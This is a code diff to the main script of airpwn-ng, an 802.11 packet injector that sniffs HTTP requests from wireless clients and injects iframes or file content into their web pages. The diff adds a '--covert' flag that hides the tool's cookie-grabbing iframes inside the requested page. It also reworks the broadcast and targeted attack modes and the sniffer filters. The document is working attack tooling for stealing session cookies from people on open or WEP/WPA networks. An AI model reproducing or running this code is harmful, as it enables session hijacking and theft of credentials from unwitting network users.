@@ -17,6 +17,7 @@ class bcolors:
     UNDERLINE = '\033[4m'
 
 
+
 '''
 Handle CTRL+C
 '''
@@ -50,12 +51,6 @@ according to what arguments are provided
 def main(args):
 	print "\n\nairpwn-ng - the new and improved 802.11 packet injector\n\n"
 
-	#CHECK DEPENDENCIES
-	try:
-		p = subprocess.Popen(["packit"], stdout=subprocess.PIPE)
-		out, err = p.communicate()
-	except:
-		print bcolors.WARNING+"[!] Packit was not found on your system, so injection for WEP/WPA encrypted networks will not work."+bcolors.ENDC
 	m_iface = args.m
 	i_iface = args.i
 
@@ -64,7 +59,7 @@ def main(args):
 		print bcolors.WARNING+"[!] It appears you are using a monitor mode interface as your monitoring input. If you are attacking open wireless networks, please use the same monitoring interface with -i for better performance."+bcolors.ENDC
 
 	if ("mon" not in m_iface):
-		print bcolors.WARNING+"[!] It appears your are trying to attack a WEP/WPA protected network. Please ensure -m is your dot11 tap interface."+bcolors.ENDC
+		print bcolors.WARNING+"[!] It appears your are trying to attack a WEP/WPA protected network. Please ensure -m is your dot11 tap interface and that -i is connected to the target AP."+bcolors.ENDC
 
 	#CHECK FOR EXCLUDED HOSTS
 	if (args.exclude_hosts is not None):
@@ -72,6 +67,7 @@ def main(args):
 		EXCLUDE_LIST=args.exclude_hosts
 		
 	injection=0
+
 	#USE INJECT FILE
 	if (args.injection is not None):
 		#CHECK IF INJECTION FILE EXISTS
@@ -83,6 +79,7 @@ def main(args):
 			exit(1)
 		print bcolors.OKGREEN+"[+] Loaded injection file",args.injection+bcolors.ENDC
 		injection=1
+
 	#USE WEBSITE LIST AND CREATE INJECTIONS ON THE FLY -- CHECK LIB/AIRPWN_NG.PY FOR MORE INFO
 	else:
 		#CHECK IF WEBSITES FILE EXISTS
@@ -102,7 +99,10 @@ def main(args):
 		print bcolors.WARNING+"[!] You are starting your attack in broadcast mode. This means you will inject packets into all clients you are able to detect. Use with caution."+bcolors.ENDC
 		#FILE INJECTION
 		if (injection==0):
-			vp=AIRPWN_NG.VictimParameters(websites=websites)
+			if (args.covert):
+				vp=AIRPWN_NG.VictimParameters(websites=websites,covert=args.covert)
+			else:
+				vp=AIRPWN_NG.VictimParameters(websites=websites)
 			if (args.exclude_hosts is None):
 				ph=AIRPWN_NG.PacketHandler(i=i_iface,victim_parameters=vp)
 			else:
@@ -111,11 +111,14 @@ def main(args):
 				snif=AIRPWN_NG.Sniffer(ph,m=m_iface)
 				snif.threaded_sniff()
 			else:
-				snif=AIRPWN_NG.Sniffer(ph,m=m_iface,filter='tcp[((tcp[12:1] & 0xf0) >> 2):4] = 0x47455420')
+				snif=AIRPWN_NG.Sniffer(ph,m=m_iface,filter='')
 				snif.threaded_sniff()
 		#WEBSITES IFRAME INJECTION
 		else:
-			vp=AIRPWN_NG.VictimParameters(inject_file=args.injection)
+			if (args.covert):
+				vp=AIRPWN_NG.VictimParameters(inject_file=args.injection,covert=args.covert,highjack=highjacker)
+			else:
+				vp=AIRPWN_NG.VictimParameters(inject_file=args.injection)
 			if (args.exclude_hosts is None):
 				ph=AIRPWN_NG.PacketHandler(i=i_iface,victim_parameters=vp)
 			else:
@@ -124,7 +127,7 @@ def main(args):
 				snif=AIRPWN_NG.Sniffer(ph,m=m_iface)
 				snif.threaded_sniff()
 			else:
-				snif=AIRPWN_NG.Sniffer(ph,m=m_iface,filter='tcp[((tcp[12:1] & 0xf0) >> 2):4] = 0x47455420')
+				snif=AIRPWN_NG.Sniffer(ph,m=m_iface,filter='')
 				snif.threaded_sniff()
 	# TARGETED MODE
 	else:
@@ -134,10 +137,13 @@ def main(args):
 		else:
 			for target in args.t:
 				print bcolors.OKGREEN+"[+] Adding target",target+bcolors.ENDC
-		#FILE INJECTION
+		#WEBSITES IFRAME INJECTION
 		if (injection==0):
 			victims=[]
-			vp=AIRPWN_NG.VictimParameters(websites=websites)
+			if (args.covert):
+				vp=AIRPWN_NG.VictimParameters(websites=websites,covert=args.covert)
+			else:
+				vp=AIRPWN_NG.VictimParameters(websites=websites)
 			for victim in args.t:
 				v1=AIRPWN_NG.Victim(mac=victim,victim_parameters=vp)
 				victims.append(v1)
@@ -149,12 +155,15 @@ def main(args):
 				snif=AIRPWN_NG.Sniffer(ph,m=m_iface)
 				snif.threaded_sniff()
 			else:
-				snif=AIRPWN_NG.Sniffer(ph,m=m_iface,filter='tcp[((tcp[12:1] & 0xf0) >> 2):4] = 0x47455420')
+				snif=AIRPWN_NG.Sniffer(ph,m=m_iface,filter='')
 				snif.threaded_sniff()			
-		#WEBSITES IFRAME INJECTION
+		#FILE INJECTION
 		else:
 			victims=[]
-			vp=AIRPWN_NG.VictimParameters(inject_file=args.injection)
+			if (args.covert):
+				vp=AIRPWN_NG.VictimParameters(inject_file=args.injection,covert=args.covert)
+			else:
+				vp=AIRPWN_NG.VictimParameters(inject_file=args.injection)
 			for victim in args.t:
 				v1=AIRPWN_NG.Victim(mac=victim,victim_parameters=vp)
 				victims.append(v1)
@@ -166,7 +175,7 @@ def main(args):
 				snif=AIRPWN_NG.Sniffer(ph,m=m_iface)
 				snif.threaded_sniff()
 			else:
-				snif=AIRPWN_NG.Sniffer(ph,m=m_iface,filter='tcp[((tcp[12:1] & 0xf0) >> 2):4] = 0x47455420')
+				snif=AIRPWN_NG.Sniffer(ph,m=m_iface)
 				snif.threaded_sniff()
 
 
@@ -186,13 +195,11 @@ if __name__ == '__main__':
 
         parser.add_argument('--exclude-hosts',nargs='*',metavar='<host>',help='Space separated list of hosts/IP addresses to exclude from injection')
 
+        parser.add_argument('--covert',action='store_true',help='Hides cookie grabbing iframes inside the requested page')
+
 	#### NOT IMPLEMENTED YET
 #        parser.add_argument('-o',metavar='<outfile>',help='Output File')
 
-        parser.add_argument('-c',metavar='<count>',help='Number of cookies to grab per website on the --websites list')
-
-        #### NOT IMPLEMENTED YET
-#        parser.add_argument('--covert',action='store_true',help='Uses less packets')
         args = parser.parse_args()
         main(args)
 
